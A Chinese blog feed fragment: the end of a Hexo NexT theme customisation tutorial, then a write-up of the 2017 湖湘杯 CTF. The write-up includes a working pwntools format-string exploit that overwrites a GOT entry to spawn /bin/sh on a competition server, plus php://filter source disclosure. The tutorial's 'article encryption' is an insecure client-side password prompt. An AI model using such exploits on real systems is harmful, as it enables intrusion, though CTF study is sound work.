hexo-wordcount --save</span><br><span class="line"></span><br><span class="line">然后在/themes/next/layout/_partials/footer.swig文件尾部加上：</span><br><span class="line"></span><br><span class="line">```js</span><br><span class="line">&lt;div class=&quot;theme-info&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="在文章底部增加版权信息"><a href="#在文章底部增加版权信息" class="headerlink" title="在文章底部增加版权信息"></a>在文章底部增加版权信息</h2><p>在目录 next/layout/_macro/下添加 my-copyright.swig：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if page.copyright %&#125;</span><br><span class="line">&lt;div class=&quot;my_post_copyright&quot;&gt;</span><br><span class="line">  &lt;script src=&quot;//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- JS库 sweetalert 可修改路径 --&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; src=&quot;http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script src=&quot;http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css&quot;&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;本文标题:&lt;/span&gt;&lt;a href=&quot;&#123;&#123; url_for(page.path) &#125;&#125;&quot;&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;文章作者:&lt;/span&gt;&lt;a href=&quot;/&quot; title=&quot;访问 &#123;&#123; theme.author &#125;&#125; 的个人博客&quot;&gt;&#123;&#123; theme.author &#125;&#125;&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;发布时间:&lt;/span&gt;&#123;&#123; page.date.format(&quot;YYYY年MM月DD日 - HH:MM&quot;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;最后更新:&lt;/span&gt;&#123;&#123; page.updated.format(&quot;YYYY年MM月DD日 - HH:MM&quot;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;原始链接:&lt;/span&gt;&lt;a href=&quot;&#123;&#123; url_for(page.path) &#125;&#125;&quot; title=&quot;&#123;&#123; page.title &#125;&#125;&quot;&gt;&#123;&#123; page.permalink &#125;&#125;&lt;/a&gt;</span><br><span class="line">    &lt;span class=&quot;copy-path&quot;  title=&quot;点击复制文章链接&quot;&gt;&lt;i class=&quot;fa fa-clipboard&quot; data-clipboard-text=&quot;&#123;&#123; page.permalink &#125;&#125;&quot;  aria-label=&quot;复制成功！&quot;&gt;&lt;/i&gt;&lt;/span&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;许可协议:&lt;/span&gt;&lt;i class=&quot;fa fa-creative-commons&quot;&gt;&lt;/i&gt; &lt;a rel=&quot;license&quot; href=&quot;https://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot; title=&quot;Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)&quot;&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。&lt;/p&gt;  </span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt; </span><br><span class="line">    var clipboard = new Clipboard(&apos;.fa-clipboard&apos;);</span><br><span class="line">    clipboard.on(&apos;success&apos;, $(function()&#123;</span><br><span class="line">      $(&quot;.fa-clipboard&quot;).click(function()&#123;</span><br><span class="line">        swal(&#123;   </span><br><span class="line">          title: &quot;&quot;,   </span><br><span class="line">          text: &apos;复制成功&apos;,   </span><br><span class="line">          html: false,</span><br><span class="line">          timer: 500,   </span><br><span class="line">          showConfirmButton: false</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;));  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<p>在目录next/source/css/_common/components/post/下添加my-post-copyright.styl：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">.my_post_copyright &#123;</span><br><span class="line">  width: 85%;</span><br><span class="line">  max-width: 45em;</span><br><span class="line">  margin: 2.8em auto 0;</span><br><span class="line">  padding: 0.5em 1.0em;</span><br><span class="line">  border: 1px solid #d3d3d3;</span><br><span class="line">  font-size: 0.93rem;</span><br><span class="line">  line-height: 1.6em;</span><br><span class="line">  word-break: break-all;</span><br><span class="line">  background: rgba(255,255,255,0.4);</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright p&#123;margin:0;&#125;</span><br><span class="line">.my_post_copyright span &#123;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  width: 5.2em;</span><br><span class="line">  color: #b5b5b5;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright .raw &#123;</span><br><span class="line">  margin-left: 1em;</span><br><span class="line">  width: 5em;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright a &#123;</span><br><span class="line">  color: #808080;</span><br><span class="line">  border-bottom:0;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright a:hover &#123;</span><br><span class="line">  color: #a3d2a3;</span><br><span class="line">  text-decoration: underline;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright:hover .fa-clipboard &#123;</span><br><span class="line">  color: #000;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright .post-url:hover &#123;</span><br><span class="line">  font-weight: normal;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright .copy-path &#123;</span><br><span class="line">  margin-left: 1em;</span><br><span class="line">  width: 1em;</span><br><span class="line">  +mobile()&#123;display:none;&#125;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright .copy-path:hover &#123;</span><br><span class="line">  color: #808080;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改next/layout/_macro/post.swig，在代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">      &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include &apos;wechat-subscriber.swig&apos; %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>之前添加增加如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">      &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include &apos;my-copyright.swig&apos; %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>如下：  </p>
<p><img src="http://upload-images.jianshu.io/upload_images/5308475-769a382b6c9ada3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">  </p>
<p>修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;my-post-copyright&quot;</span><br></pre></td></tr></table></figure>
<p>保存重新生成即可。<br>如果要在该博文下面增加版权信息的显示，需要在 Markdown 中增加copyright: true的设置，类似：<br>小技巧：如果你觉得每次都要输入copyright: true很麻烦的话,那么在/scaffolds/post.md文件中添加：  </p>
<p><img src="http://upload-images.jianshu.io/upload_images/5308475-51f087ce1f1903a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">  </p>
<p>这样每次hexo new “你的内容”之后，生成的md文件会自动把copyright:加到里面去就行了。</p>
<h2 id="隐藏网页底部powered-By-Hexo-强力驱动"><a href="#隐藏网页底部powered-By-Hexo-强力驱动" class="headerlink" title="隐藏网页底部powered By Hexo / 强力驱动"></a>隐藏网页底部powered By Hexo / 强力驱动</h2><p>打开themes/next/layout/_partials/footer.swig,使用””隐藏之间的代码即可，或者直接删除。位置如图：  </p>
<p><img src="http://upload-images.jianshu.io/upload_images/5308475-8e8340c7a0489bce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">  </p>
<h2 id="文章加密访问"><a href="#文章加密访问" class="headerlink" title="文章加密访问"></a>文章加密访问</h2><p><img src="http://upload-images.jianshu.io/upload_images/5308475-0c7e5e61b78dc937.gif?imageMogr2/auto-orient/strip" alt="">  </p>
<p>具体实现方法<br>打开themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig文件,在以下位置插入这样一段代码：  </p>
<p><img src="http://upload-images.jianshu.io/upload_images/5308475-446793cd6d740b19.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">  </p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        if(&apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123;</span><br><span class="line">            if (prompt(&apos;请输入文章密码&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123;</span><br><span class="line">                alert(&apos;密码错误！&apos;);</span><br><span class="line">                history.back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>然后在文章上加入：  </p>
<p><img src="http://i1.bvimg.com/620384/f387d75114d68796.png" alt="">  </p>
<h2 id="博文置顶"><a href="#博文置顶" class="headerlink" title="博文置顶"></a>博文置顶</h2><p>修改 hero-generator-index 插件，把文件：node_modules/hexo-generator-index/lib/generator.js 内的代码替换为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&apos;use strict&apos;;</span><br><span class="line">var pagination = require(&apos;hexo-pagination&apos;);</span><br><span class="line">module.exports = function(locals)&#123;</span><br><span class="line">  var config = this.config;</span><br><span class="line">  var posts = locals.posts;</span><br><span class="line">    posts.data = posts.data.sort(function(a, b) &#123;</span><br><span class="line">        if(a.top &amp;&amp; b.top) &#123; // 两篇文章top都有定义</span><br><span class="line">            if(a.top == b.top) return b.date - a.date; // 若top值一样则按照文章日期降序排</span><br><span class="line">            else return b.top - a.top; // 否则按照top值降序排</span><br><span class="line">        &#125;</span><br><span class="line">        else if(a.top &amp;&amp; !b.top) &#123; // 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233）</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else return b.date - a.date; // 都没定义按照文章日期降序排</span><br><span class="line">    &#125;);</span><br><span class="line">  var paginationDir = config.pagination_dir || &apos;page&apos;;</span><br><span class="line">  return pagination(&apos;&apos;, posts, &#123;</span><br><span class="line">    perPage: config.index_generator.per_page,</span><br><span class="line">    layout: [&apos;index&apos;, &apos;archive&apos;],</span><br><span class="line">    format: paginationDir + &apos;/%d/&apos;,</span><br><span class="line">    data: &#123;</span><br><span class="line">      __index: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在文章中添加 top 值，数值越大文章越靠前  </p>
<p><img src="http://i1.bvimg.com/620384/70cc95c28d3b5948.png" alt=""></p>
<h2 id="侧边栏推荐阅读"><a href="#侧边栏推荐阅读" class="headerlink" title="侧边栏推荐阅读"></a>侧边栏推荐阅读</h2><p>config搜索links<br> <img src="http://i1.bvimg.com/620384/7c0f6623c4feb576.png" alt=""></p>
<h2 id="自定义鼠标样式"><a href="#自定义鼠标样式" class="headerlink" title="自定义鼠标样式"></a>自定义鼠标样式</h2><p>打开themes/next/source/css/_custom/custom.styl,在里面写下如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 鼠标样式</span><br><span class="line">  * &#123;</span><br><span class="line">      cursor: url(&quot;http://om8u46rmb.bkt.clouddn.com/sword2.ico&quot;),auto!important</span><br><span class="line">  &#125;</span><br><span class="line">  :active &#123;</span><br><span class="line">      cursor: url(&quot;http://om8u46rmb.bkt.clouddn.com/sword1.ico&quot;),auto!important</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>其中 url 里面必须是 ico 图片，ico 图片可以上传到网上（我是使用七牛云图床），然后获取外链，复制到 url 里就行了</p>
]]></content>
      
        
        <tags>
            
            <tag> Hexo美化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[writeup for 2017湖湘杯]]></title>
      <url>/2017/11/26/wp-2017-hxb/</url>
      <content type="html"><![CDATA[<p>趁着周末打了湖相杯的复赛，槽点很多，不想说话，做了<strong>3R2M1P</strong>，可能题目质量比较水，感觉大家得分都超级高，水平不济，多请原谅。</p>
<p><img src="/2017/11/26/wp-2017-hxb/1.png" alt="">  </p>
<h1 id="1、Re4newer"><a href="#1、Re4newer" class="headerlink" title="1、Re4newer"></a>1、Re4newer</h1><p>peid查壳，发现是upx，脱壳后拖进ida查看源码<br>主程序就是和字符串异或对比<br><a id="more"></a><br><img src="http://i4.bvimg.com/620384/69750cc1d85ab06b.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	char v[100]=&#123;0x44,0x4E,0x43,0x45,0x59,0x76,0x4A,0x13,0x51,0x7D,0x4B,0x71,0x7D,0x63,0x7D,0x54</span><br><span class="line">,0x11,0x50,0x5B,0x7D,0x51,0x4B,0x4F,0x52,0x4E,0x47,0x7D,0x70,0x70,0x70,0x67,0x67</span><br><span class="line">,0x67,0x7D,0x57,0x7D,0x52,0x63,0x51,0x71,0x7D,0x13,0x56,0x5F&#125;;</span><br><span class="line">	for (i=0;i&lt;44;i++)</span><br><span class="line">	printf(&quot;%c&quot;,v[i]^0x22);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag{Th1s_iS_A_v3ry_simple_RRREEE_u_pAsS_1t}</p>
<h1 id="2、简单的android"><a href="#2、简单的android" class="headerlink" title="2、简单的android"></a>2、简单的android</h1><p>查看源码，flag就在源码里面……  </p>
<p><img src="http://i4.bvimg.com/620384/97f6767af0d8638e.png" alt=""></p>
<p>#3、Pyc分析<br>首先用uncompyle2把pyc反编译成py文件</p>
<blockquote>
<p>python -u “+unPath+”\scripts\uncompyle2 “ + file + “&gt;” + newname  </p>
</blockquote>
<p>看到代码的一刻我是崩溃的…一共就一行超长代码，还看不懂，果断放弃直接逆向分析……执行一下程序，发现是有规律的，分组加密，4位一组，可以得到3位密文，每组加密互不相关，这样的话就可以直接爆破了。刚开始直接用4位爆破，速度感人，所以再观察一下，继续测试发现，每组是有规律的，大概是这样  </p>
<p><img src="http://i4.bvimg.com/620384/b98a2047da99ec24.png" alt=""></p>
<p>（其中把每位密文以16进制形式输出，写成xx的形式）<br>于是开始优化代码，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">key=&quot;qKeywrtuiopasdfghjklzxcvbnm1234567890-_QWERTYUIOPASDFGHJLZXCVBNM&quot;</span><br><span class="line"></span><br><span class="line">secret = open(&quot;kk.enc&quot;, &apos;r&apos;)</span><br><span class="line"></span><br><span class="line">mm=secret.read()</span><br><span class="line"></span><br><span class="line">secret.close()</span><br><span class="line"></span><br><span class="line">def de(kk,w1,w2):</span><br><span class="line"></span><br><span class="line">    s=kk</span><br><span class="line"></span><br><span class="line">    flag1 = open(&quot;key.txt&quot;, &apos;w&apos;)</span><br><span class="line"></span><br><span class="line">    flag1.write(s)</span><br><span class="line"></span><br><span class="line">    flag1.close()</span><br><span class="line"></span><br><span class="line">    os.system(&quot;python revPyc.py&quot;)</span><br><span class="line"></span><br><span class="line">    flag = open(&quot;key.enc&quot;, &apos;r&apos;)</span><br><span class="line"></span><br><span class="line">    ll = flag.read()</span><br><span class="line"></span><br><span class="line">    flag.close()</span><br><span class="line"></span><br><span class="line">    a2=binascii.b2a_hex(mm[w1])</span><br><span class="line"></span><br><span class="line">    a1=binascii.b2a_hex(ll[w1])</span><br><span class="line"></span><br><span class="line">    if (a1[w2] == a2[w2]):</span><br><span class="line"></span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">while(len(mm)&gt;0):</span><br><span class="line"></span><br><span class="line">  for i in key:</span><br><span class="line"></span><br><span class="line">     if de(i,0,1)==1:</span><br><span class="line"></span><br><span class="line">        for j in key:</span><br><span class="line"></span><br><span class="line">           ss=i+j</span><br><span class="line"></span><br><span class="line">           if (de(ss,0,0)==1)and(de(ss,1,1)==1):</span><br><span class="line"></span><br><span class="line">               for k in key:</span><br><span class="line"></span><br><span class="line">                   ss=i+j+k</span><br><span class="line"></span><br><span class="line">                   if(de(ss,1,0)==1):</span><br><span class="line"></span><br><span class="line">                       for l in key:</span><br><span class="line"></span><br><span class="line">                           ss=i+j+k+l</span><br><span class="line"></span><br><span class="line">                           if (de(ss,2,0)==1)and(de(ss,2,1)==1):</span><br><span class="line"></span><br><span class="line">                               print ss</span><br><span class="line"></span><br><span class="line">                               break</span><br><span class="line"></span><br><span class="line">  mm=mm[3:-1]</span><br></pre></td></tr></table></figure></p>
<p><img src="http://i2.bvimg.com/620384/c0e85db215069132.png" alt=""> </p>
<p>可以求出三个满足条件的flag值，均提交一次，都不可以。尝试把缀余的部分删掉，再提交，也不是，无奈之下打给主办方，主办方说Key后面的d也要删掉，这个脑洞出题人你是怎么想的，你告诉我……</p>
<h1 id="4、Encryptor-apk"><a href="#4、Encryptor-apk" class="headerlink" title="4、Encryptor.apk"></a>4、Encryptor.apk</h1><p>查看Android源码，发现是用key的<strong>md5</strong>值轮换对文件加密</p>
<p><img src="http://i2.bvimg.com/620384/c8c6cb7dd04c315f.png" alt="">  </p>
<p>因为apk中是从图库选择文件，所以猜测是png、img等图像格式，枚举每个图像文件头与密文异或得到的值，其中与png文件头异或得到的值dc647eb65e6711e155375218212b3964用我的MD5求解小脚本发现可以解出来，是Password,所以源文件是png格式</p>
<p><img src="http://i2.bvimg.com/620384/d6edbb10260d8787.png" alt="">  </p>
<p>于是读取密文与这个MD5轮换加密，求出原文件长这样</p>
<p><img src="http://i2.bvimg.com/620384/820f5c9c41e5f72c.png" alt="">  </p>
<p>得到flag（吐槽一下这个字迹，不查我的有道小词库还真不知道写的是啥，而且m要大写……）</p>
<h1 id="5、pwne"><a href="#5、pwne" class="headerlink" title="5、pwne"></a>5、pwne</h1><p>产看源码，buf指针有典型的<strong>格式化漏洞</strong>，可以leak出systerm地址，写脚本cat flag</p>
<p><img src="http://i2.bvimg.com/620384/86f80c4861bb3a85.png" alt="">  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&apos;./pwne&apos;)</span><br><span class="line">p=remote(&apos;118.190.77.112&apos;,10080)</span><br><span class="line">libc=ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">p.recvuntil(&quot;WANT PLAY[Y/N]&quot;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:\n\n&apos;)</span><br><span class="line">p.sendline(&apos;%p%28$p&apos;)</span><br><span class="line">p.recvuntil(&apos;WELCOME \n&apos;)</span><br><span class="line">atoi_got=0x0804A02C</span><br><span class="line">data=p.recvline()</span><br><span class="line">data=int(data[10:20],16)</span><br><span class="line">libc_base=data-libc.symbols[&apos;_IO_2_1_stderr_&apos;]</span><br><span class="line">s_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">s_l=s_addr&amp;0x0000ffff</span><br><span class="line">s_h=(s_addr&amp;0xffff0000)&gt;&gt;16</span><br><span class="line">p.recvuntil(&quot;AGE:\n\n&quot;)</span><br><span class="line">p.sendline(&quot;18&quot;)</span><br><span class="line">p.recvuntil(&quot;WANT PLAY[Y/N]&quot;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:\n\n&apos;)</span><br><span class="line">payload=p32(atoi_got)+p32(atoi_got+2)+&quot;%%%dc&quot;%(s_l-8)+&quot;%7$hn&quot;+&quot;%%%dc&quot;%(s_h-s_l)+&quot;%8$hn&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;AGE:\n\n&quot;)</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="6、Misc-300"><a href="#6、Misc-300" class="headerlink" title="6、Misc 300"></a>6、Misc 300</h1><p>解题思路、相关代码和Flag截图：<br>刚开始队友把图片还原了出来</p>
<p><img src="http://i1.bvimg.com/620384/f582b417f83ec9f2.png" alt=""><br>估计是看图猜人名，百度识图，谷歌识图，未果。搜题目信息</p>
<blockquote>
<p>The black pixels of a b/w image are at  </p>
</blockquote>
<p>谷歌搜到了原题。。</p>
<p><img src="http://i1.bvimg.com/620384/e5854a8fb5d6c6ee.png" alt="">  </p>
<h1 id="7、流量分析"><a href="#7、流量分析" class="headerlink" title="7、流量分析"></a>7、流量分析</h1><p>拿到流量包，协议分级发现HTTP。</p>
<p><img src="http://i1.bvimg.com/620384/9b048f3d0a4a805e.png" alt="">  </p>
<p>http conatins flag条件搜索</p>
<p><img src="http://i1.bvimg.com/620384/3eb9a8526706cf47.png" alt="">  </p>
<p>提取flag.zip后，发现ce.txt</p>
<p><img src="http://i1.bvimg.com/620384/c4a7348e6b99aa34.png" alt="">  </p>
<p>想到RGB，转换成图片。</p>
<p><img src="http://i1.bvimg.com/620384/ca129bf640e11dd3.png" alt="">  </p>
<p>得到flag。</p>
<p><img src="http://i1.bvimg.com/620384/a5e3912c0d2f8f4c.png" alt="">  </p>
<h1 id="8-Web-200"><a href="#8-Web-200" class="headerlink" title="8.Web 200"></a>8.Web 200</h1><p>提示上传PNG，正常上传后发现返回500。然后检查URL，?op=home，使用php://filter读源码。</p>
<p><img src="http://i1.bvimg.com/620384/23a9f5035bcf0d42.png" alt="">  </p>
<p>直接读flag.php。</p>
<p><img src="http://i1.bvimg.com/620384/2b1912902b99b801.png" alt=""><br><img src="http://i1.bvimg.com/620384/6b5fa7f98b64dc3e.png" alt="">  </p>
<h1 id="9-Web150"><a href="#9-Web150" class="headerlink" title="9.Web150"></a>9.Web150</h1><p>这题上午没法做，下午修题了才做出来。<br>.index.php.swp源码泄露。</p>
<p><img src="http://i1.bvimg.com/620384/e5b0c930de5a21d4.png" alt="">  </p>
<p>mt_srand()随机数能够预测到。搭建相同环境可以推出相同的随机数。Ubuntu12上用PHP5写同样的create_password函数即可。</p>
<p><img src="http://i1.bvimg.com/620384/68ff2a60797987e6.png" alt="">  </p>
